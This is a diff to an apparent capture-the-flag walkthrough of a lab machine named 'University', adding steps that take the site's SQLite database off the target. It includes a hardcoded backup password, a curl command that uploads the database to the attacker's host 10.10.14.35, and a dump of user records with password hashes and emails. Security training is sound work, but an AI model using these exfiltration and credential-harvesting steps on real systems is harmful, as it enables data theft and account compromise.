@@ -219,8 +219,8 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 ### 2.3. Searching for interesting content in `C:\Web\`
 
 Using `Get-ChildItem` + `-Recurse` reveals:
-- Database backup files at `C:\Web\DB Backups`
-- Backup script `C:\Web\DB Backups\db-backup-automator.ps1` that contains password for `wao`: `WebAO1337`
+- Database file at `C:\Web\University\db.sqlite3`
+- Backup script `C:\Web\DB Backups\db-backup-automator.ps1`
 
 ```pwsh
 PS C:\Web\University> Get-ChildItem -Path C:\Web -Recurse
@@ -303,7 +303,11 @@ Mode                LastWriteTime         Length Name
 -a----        2/25/2024   5:41 PM             42 rootCA.srl
 
 ⋮
+```
 
+The backup script contains password for `wao`: `WebAO1337`
+
+```pwsh
 PS C:\Web\University> type "C:\Web\DB Backups\db-backup-automator.ps1"
 $sourcePath = "C:\Web\University\db.sqlite3"
 $destinationPath = "C:\Web\DB Backups\"
@@ -313,6 +317,61 @@ $zipFileName = "DB-Backup-$(Get-Date -Format 'yyyy-MM-dd').zip"
 $zipFilePath = Join-Path -Path $destinationPath -ChildPath $zipFileName
 $7zCommand = "& `"$7zExePath`" a `"$zipFilePath`" `"$sourcePath`" -p'WebAO1337'"
 Invoke-Expression -Command $7zCommand
+```
+
+### 2.3.1. Retrieve the database file
+
+Prepare Kali for HTTP upload
+
+```sh
+mkdir /var/www/html/uploads
+chown www-data:www-data /var/www/html/uploads
+curl -sLo /var/www/html/upload.php https://github.com/joetanx/ctf/raw/refs/heads/main/upload.php
+```
+
+Upload the file from target
+
+```pwsh
+PS C:\Web\University> cmd /c curl -H "Content-Type:multipart/form-data" -X POST -F file=@"C:\Web\University\db.sqlite3" -v http://10.10.14.35/upload.php
+cmd.exe : Note: Unnecessary use of -X or --request, POST is already inferred.
+    + CategoryInfo          : NotSpecified: (Note: Unnecessa...ready inferred.:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 10.10.14.35:80...* Connected to 10.10.14.35 (10.10.14.35) port 80> POST /upload.php HTTP/1.1> Host: 10.10.14.35> User-Agent: curl/8.9.1> Accept: */*> Content-Length: 245974> Content-Type: multipart/form-data; boundary=------------------------FImP9hxTAc2XfwhlwCWHQw> } [65335 bytes data]* upload completely sent off: 245974 bytes< HTTP/1.1 200 OK< Date: Sat, 28 Dec 2024 01:45:18 GMT< Server: Apache/2.4.62 (Debian)< Vary: Accept-Encoding< Content-Length: 331< Content-Type: text/html; charset=UTF-8< { [331 bytes data]100  240k  100   331  100  240k   7681  5574k --:--:-- --:--:-- --:--:-- 5593k* Connection #0 to host 10.10.14.35 left intact<!DOCTYPE html>
+db.sqlite3 uploaded.<html>
+  <head/>
+  <body>
+    <form action='upload.php' method='POST' enctype='multipart/form-data'>
+      <br><br>
+      Select a file to upload:
+      <br><br><br>
+      <input type='file' name='file'>
+      <br><br><br>
+      <input type='submit' name='submit'>
+    </form>
+  </body>
+</html>
+```
+
+```console
+root@kali:~# sqlite3 /var/www/html/uploads/db.sqlite3
+SQLite version 3.46.1 2024-08-13 09:16:08
+Enter ".help" for usage hints.
+sqlite> .tables
+University_course           auth_group
+University_course_students  auth_group_permissions
+University_customuser       auth_permission
+University_department       django_admin_log
+University_lecture          django_content_type
+University_professor        django_migrations
+University_student          django_session
+University_student_courses
+sqlite> SELECT * FROM University_customuser;
+2|pbkdf2_sha256$600000$igb7CzR3ivxQT4urvx0lWw$dAfkiIa438POS8K8s2dRNLy2BKZv7jxDnVuXqbZ61+s=|2024-02-26 01:47:32.992418|george|george|lantern|||1|0|0|0|Canada West - Vancouver|2024-02-19 23:23:16.293609|static/assets/images/users_profiles/2.png|Professor|george@university.htb
+3|pbkdf2_sha256$600000$i8XRGybY2ASqA3kEuTW4XH$SwK7A52nA1KOnuniKifqWzrjiIyOnrZu7sf+Zvq44qc=|2024-02-20 01:06:28.437570|carol|Carol|Helgen|||1|0|0|0|USA - Washington|2024-02-19 23:25:14.919010|static/assets/images/users_profiles/3.jpg|Professor|carol@science.com
+4|pbkdf2_sha256$600000$Bg8pRHaZsbGpLwirrZPvvn$7CtXYJhBDrGhiCvjma7X/AOKRWZS2SP0H6PAXvT96Vw=|2024-02-20 00:59:29.687668|Nour|Nour|Qasso|||1|0|0|0|Germany - Frankfurt|2024-02-19 23:27:04.700197|static/assets/images/users_profiles/4.jpg|Professor|nour.qasso@gmail.com
+5|pbkdf2_sha256$600000$VzP8VVjEQgQw6HvYAftmCl$s9k3UC/e2++hhQDF2KzhunOaAqxbi4rugRb42dC6qr0=|2024-02-20 00:37:55.455163|martin.rose|Martin|Rose|||1|0|0|0|US West - Los Angeles|2024-02-19 23:28:49.293710|static/assets/images/users_profiles/5.jpg|Professor|martin.rose@hotmail.com
+6|pbkdf2_sha256$600000$1s48WhgRDulQ6FsNgnXjot$SZ4piS9Ryf4mgIj0prEjN+F0pGEDtNti3b9WaQfAeTk=|2024-09-16 12:43:05.500724|nya|Nya|Laracrof||static/assets/uploads/CSRs/6_mnY36oU.csr|1|0|0|0|UK - London|2024-02-19 23:31:30.168489|static/assets/images/users_profiles/6.jpg|Professor|nya.laracrof@skype.com
+7|pbkdf2_sha256$600000$70XtdR4HrHHignt7EHiOpT$RP9/4PKHmbtCBq0FOPqyppQKjXntM89vc7jGyjk/zAk=|2024-02-26 01:42:16.677697|Steven.U|Steven|Universe|<h3>The First student in this university!</h3>|static/assets/uploads/CSRs/7.csr|1|0|0|0|Italy - Milan|2024-02-25 23:08:44.508623|static/assets/images/users_profiles/7.jpeg|Student|steven@yahoo.com
 ```
 
 ## 3. Exploring with found credentials
@@ -374,7 +433,7 @@ LDAP        10.10.11.39     389    DC               William.B                   
 The network configuration reveals that the target is attached to a vSwitch in the `192.168.99.0/24` subnet
 
 ```pwsh
-PS C:\Web\University> ipconfig
+PS C:\Users\WAO\Documents> ipconfig
 
 Windows IP Configuration
 
@@ -621,7 +680,7 @@ User wao may run the following commands on LAB-2:
     (ALL : ALL) ALL
 ```
 
-The `Downloads` directory in `wao`'s home directory appears to be the developer work area for the site, CAs were found in this directory too:
+The `Downloads` directory in `wao`'s home directory appears to be the developer work area for the site, `rootCA.key` is found in this directory too:
 
 ```console
 wao@LAB-2:~$ ls -lRa
